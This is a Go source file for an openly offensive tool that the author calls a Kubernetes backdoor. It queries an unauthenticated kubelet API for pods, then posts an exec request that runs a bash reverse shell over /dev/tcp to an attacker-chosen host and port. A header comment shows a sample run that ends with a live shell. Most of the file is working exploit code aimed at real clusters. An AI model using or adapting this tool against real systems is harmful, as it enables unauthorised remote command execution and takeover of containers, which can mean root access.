/*
k8sio_autoshell.go
chris.downs[at]reticulipictures.com
Tue Sep 25 08:26:00 CDT 2018

Kubernetes backdoor:
remote exec to unauthenticated kubelet Api.
exec reverse shell from container of choice.

note: obviously a container running as root will
drop a root shell --

Example:
➜ go run k8sio_autoshell.go -t 10.10.201.179
target url: https://10.10.201.179:10250

2018/09/25 10:28:43 Wrote 15818 bytes
2018/09/25 10:28:43 You may want to inspect 'pod.json' for further information gathering.

Available target Pods:
-> 0 cilium-agent -> /api/v1/namespaces/default/pods/cilium-fzbqm
-> 1 coredns -> /api/v1/namespaces/default/pods/coredns-8c7c85474-rlzjn
-> 2 heapster -> /api/v1/namespaces/default/pods/heapster-84d98db467-fl7v7
-> 3 busybox -> /api/v1/namespaces/default/pods/busybox-74db8b6768-c8f8f

pod [n]: 1
lhost [ex: 192.168.22.33]: 192.168.0.5
lport [ex: 4444]: 31337

-> Assembling target payload:

payload: -> https://10.10.201.179:10250/exec/default/coredns-8c7c85474-rlzjn/coredns?command=/bin/sh&command=-c&command=bash%20-i%20>&%20/dev/tcp/192.168.0.5/31337%200>&1&input=1&output=1&tty=1

2018/09/25 10:28:50 Listening on 127.0.0.1:31337
2018/09/25 10:28:55 Accepted connection from 127.0.0.1:58110
id ; hostname ; uname -r
uid=1000(cdowns) gid=1000(cdowns) groups=1000(cdowns),7(lp),29(audio),44(video),154(wireshark)
7242-alpha-reticuli
4.18.0-kali1-amd64
*/

package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

// ghetto structs --
// https://godoc.org/github.com/golang/build/kubernetes/api#PodList
// We only need to assemble the exec payload
type Podlist struct {
	Pods []Pod `json:"items"`
}

// items --
type Pod struct {
	// ObjectMeta entry --
	Metadata struct {
		Name      string `json:"name"`
		Namespace string `json:"namespace"`
		Selflink  string `json:"selfLink`
		Labels    struct {
			K8sapp string `json:"k8s-app,omitempty"`
		}
	}
	Spec struct {
		Containers []Container `json:"containers"`
	}
}

// need DNS name for full url construct --
type Container struct {
	Name string `json:"name"`
}

// long flags --
var targetFlag = flag.String("target:", "", "target address ex: 192.168.x.x")
var portFlag = flag.String("port:", "10250", "port")
var path = "/pods"
var jsfile = "json/pod.json"
var scheme = "https://"

// short flags --
func init() {
	flag.StringVar(targetFlag, "t", "", "target Ip Address ex: 192.168.x.x")
	flag.StringVar(portFlag, "p", "10250", "port")
}

// start main --
func main() {
	flag.Parse()
	if *targetFlag == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}
	if *portFlag == "10255" {
		scheme = "http://"
	}
	url := strings.Join([]string{scheme, *targetFlag, ":", *portFlag}, "")
	fmt.Print("target url: ", url, "\n\n")

	k8sio_GetTarget_Json(url, jsfile, path)
	k8sio_PostPayload_Command(url, jsfile)
}

// get target podlist Json --
// https://developers.whatismybrowser.com/useragents/explore/software_name/chrome/
func k8sio_GetTarget_Json(url string, jsfile string, path string) {
	// reset url --
	// /pods --
	purl := strings.Join([]string{url, path}, "")

	// connect --
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{}

	req, err := http.NewRequest("GET", purl, nil)
	perror(err)

	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
	res, err := client.Do(req)
	perror(err)

	defer res.Body.Close()
	buf, err := ioutil.ReadAll(res.Body)
	perror(err)

	file, err := os.OpenFile(jsfile, os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		fmt.Println("Exists or Create failed")
		os.Exit(1)
	}
	defer file.Close()

	bwrite, err := file.Write(buf)
	perror(err)
	log.Printf("Wrote %d bytes\n", bwrite)
	log.Printf("You may want to inspect 'pod.json' for further information gathering.\n\n")

}

// Parse Json and assmeble payload --
func k8sio_PostPayload_Command(url string, jsfile string) {
	file, err := os.Open(jsfile)
	perror(err)
	defer file.Close()

	// byte array
	b, _ := ioutil.ReadAll(file)

	// initiaize arrays
	p := Podlist{}
	json.Unmarshal(b, &p)

	// target item data
	fmt.Println("Available target Pods:")
	for i := 0; i < len(p.Pods); i++ {
		fmt.Printf("-> %d %s -> %s\n", i, p.Pods[i].Spec.Containers[0].Name, p.Pods[i].Metadata.Selflink)
	}

	fmt.Print("\npod [n]: ")
	var podnum int
	fmt.Scanln(&podnum)

	fmt.Print("lhost [ex: 192.168.22.33]: ")
	var lhost string
	fmt.Scanln(&lhost)

	fmt.Print("lport [ex: 4444]: ")
	var lport string
	fmt.Scanln(&lport)

	fmt.Println("\n-> Assembling target payload:\n")

	// assemble --
	// /exec/namespace/podname/container-name?
	pcmd := strings.Join([]string{"?command=/bin/sh&command=-c&command=bash%20-i", "%20>&%20/dev/tcp/", lhost, "/", lport, "%200>&1"}, "")
	ttycmd := ("&input=1&output=1&tty=1")
	pstring := strings.Join([]string{url, "/exec/", p.Pods[podnum].Metadata.Namespace, "/", p.Pods[podnum].Metadata.Name, "/", p.Pods[podnum].Spec.Containers[0].Name}, "")
	payload := strings.Join([]string{pstring, pcmd, ttycmd}, "")
	fmt.Println("payload: ->", payload)
	k8sio_HttpPost_UriExec(payload)

	k8sio_ExecListener(lport)
}

// http Post data --
func k8sio_HttpPost_UriExec(payload string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{}

	req, err := http.NewRequest("POST", payload, nil)
	perror(err)

	req.Header.Set("Access-Control-Allow-Origin", *targetFlag)
	req.Header.Set("X-Stream-Protocol-Version", "v2.channel.k8s.io")
	req.Header.Set("X-Stream-Protocol-Version", "channel.k8s.io")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
	res, err := client.Do(req)
	perror(err)

	defer res.Body.Close()
	buf, err := ioutil.ReadAll(res.Body)

	b := string(buf)
	fmt.Printf(b)

	// to-do --
	// muther trucka stopped working. Need to parse response.
	// k8sio_WscatExec_Uri()
}

// wscat used to exec remote cri/exec --
// /usr/bin/wscat --no-check -c https://x.x.x.x:10250/cri/exec/e85Y-wUR
// https://github.com/websockets/wscat
func k8sio_WscatExec_Uri() {

}

// Start Ncat Listener  --
func k8sio_ExecListener(lport string) {
	host := strings.Join([]string{"127.0.0.1:", lport}, "")

	sock := host
	l, err := net.Listen("tcp", sock)
	if nil != err {
		log.Fatalf("Could not bind to interface", err)
	}
	defer l.Close()
	log.Println("Listening on", l.Addr())
	for {
		c, err := l.Accept()
		if nil != err {
			log.Fatalf("Could not accept connection", err)
		}
		log.Println("Accepted connection from", c.RemoteAddr())
		go io.Copy(c, os.Stdin)
		go io.Copy(os.Stdout, c)
	}
}

// lazy man errors
func perror(err error) {
	if err != nil {
		panic(err)
	}
}

/*




Thanks VIM ultra cool formatting;
leave some space to write shit for christ sake --
*/
